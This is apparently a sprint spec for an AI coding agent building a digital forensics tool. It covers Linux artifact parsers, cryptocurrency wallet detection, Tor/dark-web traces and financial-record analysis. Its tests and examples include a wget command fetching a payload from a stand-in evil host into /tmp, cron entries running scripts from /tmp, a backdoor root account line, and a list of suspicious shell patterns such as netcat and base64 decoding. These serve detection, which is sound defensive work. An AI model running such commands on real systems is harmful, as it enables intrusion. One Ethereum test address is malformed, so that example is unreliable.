# Sprint 20 — Linux Forensics + Cryptocurrency Artifacts + Tor/Dark Web
# FOR CODEX — Read AGENTS.md before starting

_Date: 2026-04-26_
_Agent: Codex (OpenAI)_
_Approved by: KR_
_Working directory: ~/Wolfmark/strata/_

---

## Before you start

1. Read AGENTS.md completely
2. Run `git pull`
3. Run `cargo test -p strata-shield-engine --test quality_gate`
4. Run `cargo test --workspace 2>&1 | tail -5`
5. Both must pass. Baseline: 3,997 tests.

---

## Hard rules

- Zero new `.unwrap()` in production code
- Zero new `unsafe{}` without justification
- Zero new `println!` in library code
- Quality gate must pass after every priority
- All 9 load-bearing tests must always pass
- `cargo clippy --workspace -- -D warnings` clean
- `npm run build --prefix apps/strata-ui` clean
- Do NOT use `git add -A` — stage only files you modified

---

## PRIORITY 1 — Linux Forensics (ARBOR Plugin)

### Context

Linux servers, containers, and WSL environments are increasingly
common in casework — insider threats on Linux workstations, server
compromise investigations, cloud forensics. Strata has no dedicated
Linux artifact plugin. This sprint builds one.

Plugin name: **ARBOR** (Linux system artifacts)
Color: `#84cc16` (lime green)
Category: System Artifacts

### Investigation first

```bash
grep -rn "linux\|Linux\|arbor\|ARBOR" \
    plugins/ --include="*.rs" | grep -v target | head -10

ls plugins/ | grep -i linux
```

If no Linux plugin exists, create it:

```bash
# Check Cargo.toml for existing plugin workspace members
grep -n "plugins/" Cargo.toml | head -20
```

### Linux artifacts to parse

**1. /etc/passwd — User accounts**
```
root:x:0:0:root:/root:/bin/bash
user:x:1000:1000:User Name:/home/user:/bin/bash
```
Parse: username, uid, gid, home dir, shell.
Flag UID=0 accounts (root-equivalent) and accounts with no password
lock (empty password field).
MITRE: T1136.001 (Create Local Account)

**2. /etc/shadow — Password hashes**
```
root:$6$salt$hash:18000:0:99999:7:::
user:!:18000::::::: 
```
Parse: username, hash algorithm ($1=MD5, $5=SHA256, $6=SHA512),
locked accounts (`!` or `*` prefix), last password change date.
Flag: accounts with no expiry, weak hash algorithms (MD5/$1).
MITRE: T1003.008 (Credential Dumping: /etc/passwd and /etc/shadow)
Forensic value: HIGH

**3. /var/log/auth.log — Authentication events**
```
Apr 26 08:15:32 host sshd[1234]: Accepted password for user from 192.168.1.100 port 54321 ssh2
Apr 26 08:16:01 host sudo: user : TTY=pts/0 ; PWD=/home/user ; USER=root ; COMMAND=/bin/bash
```
Parse: timestamp, event type (Accepted/Failed/sudo), username, source IP.
Flag: SSH brute force (>5 failed attempts from same IP), successful root sudo.
MITRE: T1078 (Valid Accounts), T1021.004 (SSH)

**4. /var/log/syslog or /var/log/messages — System events**
Parse: cron jobs executed, service start/stop, kernel messages.
Flag: cron jobs added/modified, unusual service restarts.
MITRE: T1053.003 (Scheduled Task: Cron)

**5. ~/.bash_history — Command history**
One command per line. Parse all commands.
Flag: wget/curl downloads, base64 decodes, nc/netcat, chmod +x,
      password-like patterns in commands.
MITRE: T1059.004 (Unix Shell)
Forensic value: HIGH — direct evidence of user actions

**6. /etc/crontab + /etc/cron.d/ — Scheduled tasks**
```
* * * * * root /usr/bin/evil.sh
```
Parse: schedule, user, command.
Flag: commands pointing to temp directories (/tmp, /dev/shm),
      base64 encoded commands, wget/curl in cron.
MITRE: T1053.003

**7. /etc/hosts — Host file modifications**
Parse all non-comment entries.
Flag: entries pointing localhost/127.0.0.1 to production domains
      (DNS hijacking indicator).
MITRE: T1565.001 (Data Manipulation: Stored Data)

**8. ~/.ssh/ — SSH artifacts**
- `authorized_keys` — who can SSH in without a password
- `known_hosts` — systems this user has connected to
- `id_rsa`, `id_ed25519` — private keys (flag presence, not content)
MITRE: T1098.004 (Account Manipulation: SSH Authorized Keys)

**9. /proc/net/tcp + /proc/net/tcp6 — Network connections**
Hex-encoded local/remote address:port pairs.
Decode from hex, convert to dotted notation.
MITRE: T1049 (System Network Connections Discovery)

**10. Linux persistence locations**
```
/etc/rc.local                    — legacy init persistence
/etc/init.d/                     — SysV init scripts
/etc/systemd/system/             — systemd service units
~/.config/autostart/             — desktop autostart
/etc/profile.d/                  — shell profile persistence
```
Flag any non-standard entries in these locations.
MITRE: T1547.013 (Boot or Logon: rc.scripts)

### Implementation

Create `plugins/strata-plugin-arbor/`:

```bash
mkdir -p plugins/strata-plugin-arbor/src
```

`plugins/strata-plugin-arbor/Cargo.toml`:
```toml
[package]
name = "strata-plugin-arbor"
version = "0.1.0"
edition = "2021"

[dependencies]
strata-plugin-sdk = { path = "../../crates/strata-plugin-sdk" }
serde = { version = "1", features = ["derive"] }
log = "0.4"
chrono = { version = "0.4", features = ["serde"] }
```

Add to workspace `Cargo.toml`:
```toml
"plugins/strata-plugin-arbor",
```

Add to plugin registry in `crates/strata-engine-adapter/src/plugins.rs`.

### Tests

```rust
#[test]
fn arbor_passwd_parses_root_entry() {
    let line = "root:x:0:0:root:/root:/bin/bash";
    let entry = parse_passwd_line(line).unwrap();
    assert_eq!(entry.username, "root");
    assert_eq!(entry.uid, 0);
}

#[test]
fn arbor_passwd_flags_uid_zero_non_root() {
    let line = "backdoor:x:0:0::/tmp:/bin/bash";
    let entry = parse_passwd_line(line).unwrap();
    assert!(entry.is_suspicious_uid_zero);
}

#[test]
fn arbor_shadow_detects_weak_md5_hash() {
    let line = "user:$1$salt$hash:18000:0:99999:7:::";
    let entry = parse_shadow_line(line).unwrap();
    assert_eq!(entry.hash_algorithm, "MD5");
    assert!(entry.is_weak_algorithm);
}

#[test]
fn arbor_bash_history_flags_wget_download() {
    let cmd = "wget http://evil.com/payload.sh -O /tmp/payload.sh";
    let analysis = analyze_bash_command(cmd);
    assert!(analysis.is_suspicious);
    assert!(analysis.flags.contains(&"download_to_tmp"));
}

#[test]
fn arbor_crontab_flags_tmp_execution() {
    let entry = "* * * * * root /tmp/evil.sh";
    let parsed = parse_crontab_line(entry).unwrap();
    assert!(parsed.is_suspicious);
}
```

### Acceptance criteria — P1

- [ ] ARBOR plugin created with all 10 artifact parsers
- [ ] /etc/passwd with suspicious UID=0 detection
- [ ] /etc/shadow with hash algorithm flagging
- [ ] ~/.bash_history with suspicious command detection
- [ ] /etc/crontab with temp-dir execution flagging
- [ ] ~/.ssh/authorized_keys parsed
- [ ] MITRE techniques mapped for all artifact types
- [ ] 5 new tests pass
- [ ] Quality gate passes
- [ ] ARBOR in plugin registry

---

## PRIORITY 2 — Cryptocurrency Wallet Artifacts

### Context

Cryptocurrency evidence is critical for IRS-CI, USSS, DEA, and
FBI casework. Strata currently has no cryptocurrency artifact
detection. This sprint adds detection of wallet files, transaction
histories, and exchange artifacts across all platforms.

MITRE: T1583.006 (Web Services: Cryptocurrency)

### What to detect

**Bitcoin Core wallet.dat:**
Location: `%APPDATA%\Bitcoin\wallet.dat` (Windows)
         `~/Library/Application Support/Bitcoin/wallet.dat` (macOS)
         `~/.bitcoin/wallet.dat` (Linux)
Format: Berkeley DB format. Don't parse the DB — detect the file
and flag its presence, size, and modification date.
The presence of a wallet.dat is evidence of Bitcoin Core usage.

**Electrum wallet files:**
Location: `%APPDATA%\Electrum\wallets\` (Windows)
         `~/.electrum/wallets/` (Linux)
Format: JSON files containing encrypted seed data.
Parse the JSON for: wallet type (standard, multisig, hardware),
seed_version, use_encryption (bool).

```rust
pub struct ElectrumWallet {
    pub file_path: String,
    pub wallet_type: String,
    pub seed_version: Option<i64>,
    pub use_encryption: bool,
    pub is_encrypted: bool,
}
```

**MetaMask browser extension:**
Location: Chrome profile `Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn/`
Files: LevelDB format containing encrypted vault.
Detect the directory and flag MetaMask presence.
Don't attempt to decrypt — flag for examiner follow-up.

**Coinbase/Exchange browser artifacts:**
In browser history (Vector plugin already parses Chrome history):
Look for domains: coinbase.com, binance.com, kraken.com,
                  crypto.com, gemini.com, blockchain.com
Flag: login events, transaction pages, withdrawal pages.

**Cryptocurrency address detection in all artifacts:**
Add a cross-cutting detector that scans artifact values for:
```rust
// Bitcoin address patterns
const BTC_LEGACY: &str = r"\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\b";
const BTC_SEGWIT: &str = r"\bbc1[a-z0-9]{39,59}\b";
// Ethereum address
const ETH_ADDR: &str = r"\b0x[a-fA-F0-9]{40}\b";
// Monero address  
const XMR_ADDR: &str = r"\b4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}\b";
```

When found in any artifact value, add a structured sub-artifact:
```
Cryptocurrency Address Detected
  Type: Bitcoin (Legacy)
  Address: 1A1zP1eP5QGefi2DMPTfTL5SLmv7Divf
  Found in: Browser History artifact
  MITRE: T1583.006
  Forensic Value: HIGH
```

**Hardware wallet connection artifacts (Windows):**
```
HKLM\SYSTEM\CurrentControlSet\Enum\USB\
```
Look for known hardware wallet VID/PID pairs:
```rust
const HARDWARE_WALLETS: &[(&str, &str, &str)] = &[
    ("VID_2C97", "PID_0001", "Ledger Nano S"),
    ("VID_2C97", "PID_4011", "Ledger Nano X"),
    ("VID_1209", "PID_53C1", "Trezor Model T"),
    ("VID_1209", "PID_53C0", "Trezor One"),
    ("VID_1209", "PID_4B24", "Coldcard"),
];
```

### Implementation

Add cryptocurrency parsers to appropriate existing plugins:
- Bitcoin Core wallet.dat → Phantom (Windows) / MacTrace (macOS) / ARBOR (Linux)
- Electrum → Phantom (Windows path) / ARBOR (Linux path)
- MetaMask → Vector plugin (browser extension artifacts)
- Address detection → cross-plugin utility in `strata-core`

Create `crates/strata-core/src/crypto_detect.rs`:
```rust
pub fn scan_for_crypto_addresses(text: &str) -> Vec<CryptoAddress> {
    // Scan text for BTC/ETH/XMR address patterns
    // Return all matches with type and position
}

pub struct CryptoAddress {
    pub address: String,
    pub currency: CryptoCurrency,
    pub confidence: f32,
}

pub enum CryptoCurrency {
    Bitcoin,
    BitcoinSegwit,
    Ethereum,
    Monero,
    Unknown,
}
```

### Tests

```rust
#[test]
fn crypto_detect_btc_legacy_address() {
    let text = "send to 1A1zP1eP5QGefi2DMPTfTL5SLmv7Divf6X";
    let addrs = scan_for_crypto_addresses(text);
    assert_eq!(addrs.len(), 1);
    assert!(matches!(addrs[0].currency, CryptoCurrency::Bitcoin));
}

#[test]
fn crypto_detect_eth_address() {
    let text = "wallet: 0x742d35Cc6634C0532925a3b8D4C9f5E6734";
    let addrs = scan_for_crypto_addresses(text);
    assert!(addrs.iter().any(|a| 
        matches!(a.currency, CryptoCurrency::Ethereum)));
}

#[test]
fn crypto_detect_no_false_positive_on_random_hex() {
    let text = "sha256: a3f4b2c1d8e9f0a1b2c3d4e5f6a7b8c9";
    let addrs = scan_for_crypto_addresses(text);
    assert!(addrs.is_empty());
}

#[test]
fn electrum_wallet_encryption_detected() {
    let json = r#"{"wallet_type":"standard","use_encryption":true,"seed_version":17}"#;
    let wallet = parse_electrum_wallet(json).unwrap();
    assert!(wallet.is_encrypted);
    assert_eq!(wallet.seed_version, Some(17));
}
```

### Acceptance criteria — P2

- [ ] Bitcoin Core wallet.dat detection on Windows/macOS/Linux
- [ ] Electrum wallet JSON parser
- [ ] MetaMask extension directory detection
- [ ] Hardware wallet USB VID/PID detection
- [ ] `scan_for_crypto_addresses()` utility function
- [ ] BTC legacy, BTC SegWit, ETH, XMR patterns
- [ ] Cross-artifact address scanning integrated
- [ ] MITRE T1583.006 mapped
- [ ] 4 new tests pass
- [ ] Quality gate passes

---

## PRIORITY 3 — Tor / Dark Web Artifacts

### Context

Dark web investigations are a core mission for HSI, FBI, DEA, and
ICAC. Tor Browser leaves distinctive artifacts that prove dark web
access even after the browser is closed or deleted.

MITRE: T1090.003 (Proxy: Multi-hop Proxy)

### Tor Browser artifacts

**Tor Browser profile (Firefox-based):**
Location: `%APPDATA%\Tor Browser\Browser\TorBrowser\Data\Browser\profile.default\`
         `~/Library/Application Support/TorBrowser-Data/Browser/profile.default/`

Key files to parse:
```
places.sqlite          ← browsing history (.onion URLs)
formhistory.sqlite     ← form data
cookies.sqlite         ← cookies (Tor Browser clears these but may remain)
key4.db                ← Firefox key database
logins.json            ← saved logins
prefs.js               ← Tor Browser configuration
```

**Tor Browser history (.onion URLs):**
The `places.sqlite` contains the same schema as Firefox history.
Vector already parses Firefox history. The difference: detect
`.onion` URLs specifically.

```rust
pub fn is_onion_url(url: &str) -> bool {
    url.contains(".onion")
}

pub struct TorHistoryEntry {
    pub url: String,
    pub title: Option<String>,
    pub visit_date: i64,
    pub is_onion: bool,
    pub onion_address: Option<String>,  // the .onion hostname
}
```

**Tor Browser installation indicators:**
Look for these files regardless of current presence:
```
tor.exe / tor (binary)
torrc (configuration file)
cached-microdesc-consensus (relay list cache)
cached-certs
state (Tor state file — contains circuit history)
```

The `state` file contains:
- `LastWritten` — when Tor last ran
- `EntryGuard` lines — which guard nodes were used
- `BWHistoryReadValues` — bandwidth usage history

Parse `LastWritten` and bandwidth history to establish timeline
of Tor usage.

**I2P artifacts:**
Location: `%APPDATA%\I2P\` (Windows)
         `~/.i2p/` (Linux/macOS)
Key files:
- `router.config` — I2P router configuration
- `logs/` — connection logs
- `addressbook/` — I2P address book (like a DNS for I2P)

Flag presence of I2P installation.
MITRE: T1090.003

**Tails OS indicators on host:**
If examining a Windows/macOS machine, look for:
- USB drive artifacts (from USBSTOR) with "Tails" in the volume label
- Ventoy bootloader (commonly used with Tails)
- `/boot/grub/grub.cfg` referencing Tails on connected drives

**ProxyChains artifacts (Linux):**
`/etc/proxychains.conf` or `~/.proxychains/proxychains.conf`
Presence indicates deliberate proxy chaining for anonymization.

**VPN artifacts:**
```
Windows: C:\Program Files\OpenVPN\
         C:\Program Files\NordVPN\
         C:\Program Files\ProtonVPN\
macOS: /Applications/Mullvad VPN.app/
       ~/Library/Application Support/NordVPN/
```
Flag VPN software installation and configuration files.
Look for `.ovpn` files (OpenVPN configs) — may contain server details.

### Implementation

Add to appropriate existing plugins:
- Tor Browser history → Vector plugin (already parses Firefox)
- Tor state file → new `tor.rs` in Vector plugin
- I2P artifacts → new `i2p.rs` in Vector plugin
- VPN artifacts → Phantom (Windows) / MacTrace (macOS) / ARBOR (Linux)

```rust
// In Vector plugin, add tor.rs:
pub struct TorStateFile {
    pub last_written: Option<i64>,
    pub entry_guards: Vec<String>,
    pub bw_read_total_kb: Option<u64>,
    pub bw_write_total_kb: Option<u64>,
}

pub fn parse_tor_state(content: &str) -> TorStateFile {
    // Parse key=value format
    // Extract LastWritten, EntryGuard lines, BWHistory
}
```

**Cross-reference with browser history:**
When Tor Browser history contains .onion URLs, emit a CRITICAL
advisory artifact:

```
DARK WEB ACCESS CONFIRMED
  Browser: Tor Browser
  Onion URLs accessed: 7
  First access: 2025-11-04 17:19:08 UTC
  Last access:  2025-11-25 09:00:00 UTC
  Tor last active: 2025-11-25 09:00:00 UTC (from state file)
  MITRE: T1090.003
  Forensic Value: CRITICAL
```

### Tests

```rust
#[test]
fn onion_url_detected() {
    assert!(is_onion_url("http://facebookwkhpilnemxj7ascrwwwi72yxv7zntv5srhd6j4zmgg3pryd.onion/"));
    assert!(!is_onion_url("https://facebook.com/"));
}

#[test]
fn tor_state_last_written_parsed() {
    let content = "LastWritten 2025-11-25 09:00:00\nEntryGuard node1 key\n";
    let state = parse_tor_state(content);
    assert!(state.last_written.is_some());
    assert_eq!(state.entry_guards.len(), 1);
}

#[test]
fn tor_state_bandwidth_parsed() {
    let content = "BWHistoryReadValues 1024,2048,512\nBWHistoryWriteValues 512,1024,256\n";
    let state = parse_tor_state(content);
    assert!(state.bw_read_total_kb.is_some());
}

#[test]
fn dark_web_critical_advisory_emitted() {
    // Mock: Tor history with .onion URLs present
    // Verify: Critical advisory artifact emitted
    // Verify: advisory_notice contains "DARK WEB ACCESS"
}
```

### Acceptance criteria — P3

- [ ] Tor Browser profile detected (Windows + macOS + Linux paths)
- [ ] .onion URL detection in browser history
- [ ] Tor state file parser (LastWritten, guards, bandwidth)
- [ ] I2P installation detection
- [ ] VPN software installation detection
- [ ] ProxyChains config detection (Linux)
- [ ] CRITICAL advisory when .onion URLs confirmed
- [ ] MITRE T1090.003 mapped
- [ ] 4 new tests pass
- [ ] Quality gate passes

---

## PRIORITY 4 — Financial Artifacts (IRS-CI / USSS / SEC)

### Context

Financial investigation casework requires detecting evidence of
financial software, transaction records, and account artifacts.
IRS-CI, USSS, and SEC examiners need this.

### What to detect

**QuickBooks artifacts:**
```
Windows: C:\Users\<user>\Documents\QuickBooks\
         %APPDATA%\Intuit\QuickBooks\
Files: *.QBW (company file), *.QBB (backup), *.QBO (bank download)
```

Detect and flag the presence of QuickBooks files.
Parse `.QBO` files (OFX format — plain XML):

```xml
<STMTTRN>
  <TRNTYPE>DEBIT</TRNTYPE>
  <DTPOSTED>20251104120000</DTPOSTED>
  <TRNAMT>-1500.00</TRNAMT>
  <FITID>202511041</FITID>
  <NAME>SUSPICIOUS VENDOR</NAME>
</STMTTRN>
```

```rust
pub struct OFXTransaction {
    pub transaction_type: String,   // DEBIT, CREDIT, etc
    pub date: Option<i64>,
    pub amount: f64,
    pub payee: Option<String>,
    pub memo: Option<String>,
    pub transaction_id: String,
}
```

Flag: large cash transactions, round number transactions over
$10,000 (structuring indicator), frequent transactions just under
$10,000 (structuring indicator — T1657).

**Bank/financial statement artifacts (PDF parsing):**
Detect PDFs with names matching patterns:
- `statement_*.pdf`, `*_statement.pdf`
- `account_*.pdf`, `*.pdf` in a folder named "Statements"
Flag presence — content examination by examiner.

**Wire transfer records:**
Look for CSV files with columns matching wire transfer formats.
Detect: amount, routing number patterns (9 digits), SWIFT codes.

**Hidden/encrypted financial files:**
Look for `.xls`, `.xlsx`, `.csv` files with names containing:
`account`, `transaction`, `balance`, `wire`, `transfer`, `offshore`
In locations outside standard documents folders (Desktop, temp dirs).
Flag as potentially significant.

### Tests

```rust
#[test]
fn ofx_transaction_parsed_correctly() {
    let xml = r#"<STMTTRN><TRNTYPE>DEBIT</TRNTYPE>
        <DTPOSTED>20251104120000</DTPOSTED>
        <TRNAMT>-9999.00</TRNAMT>
        <NAME>CASH WITHDRAWAL</NAME></STMTTRN>"#;
    let txn = parse_ofx_transaction(xml).unwrap();
    assert_eq!(txn.transaction_type, "DEBIT");
    assert_eq!(txn.amount, -9999.0);
}

#[test]
fn structuring_detected_under_10k() {
    let txn = OFXTransaction {
        amount: -9500.0,
        transaction_type: "DEBIT".into(),
        ..Default::default()
    };
    assert!(is_potential_structuring(&txn));
}

#[test]
fn quickbooks_qbw_file_detected() {
    let path = std::path::Path::new("C:/Users/user/Documents/company.QBW");
    assert!(is_quickbooks_file(path));
}
```

### Acceptance criteria — P4

- [ ] QuickBooks file detection (.QBW, .QBB, .QBO)
- [ ] OFX/QBO transaction parser
- [ ] Structuring detection (transactions just under $10,000)
- [ ] Financial statement PDF detection
- [ ] Suspicious financial filename detection in unusual locations
- [ ] MITRE T1657 (Financial Theft) mapped
- [ ] 3 new tests pass
- [ ] Quality gate passes

---

## After all priorities complete

```bash
cargo test --workspace 2>&1 | grep "test result" | grep "passed" | \
    awk -F' ' '{sum += $4} END {print sum " total passing"}'
cargo test -p strata-shield-engine --test quality_gate 2>&1 | tail -3
cargo clippy --workspace -- -D warnings 2>&1 | grep "^error" | head -5
npm run build --prefix apps/strata-ui 2>&1 | tail -3
```

Stage only Sprint 20 files:
```bash
git add <only files you modified>
git commit -m "feat: sprint-20 Linux forensics (ARBOR) + crypto wallets + Tor dark web + financial artifacts"
```

Report:
- Which priorities passed
- Test count before (3,997) and after
- Whether ARBOR shows in plugin registry
- Any deviations from spec

---

_Sprint 20 for Codex — read AGENTS.md first_
_KR approval: granted_
_P1 (ARBOR) is highest priority — Linux is a real gap._
_P3 (Tor) is highest forensic value for dark web casework._
_All four if context allows. Document stopping point if not._
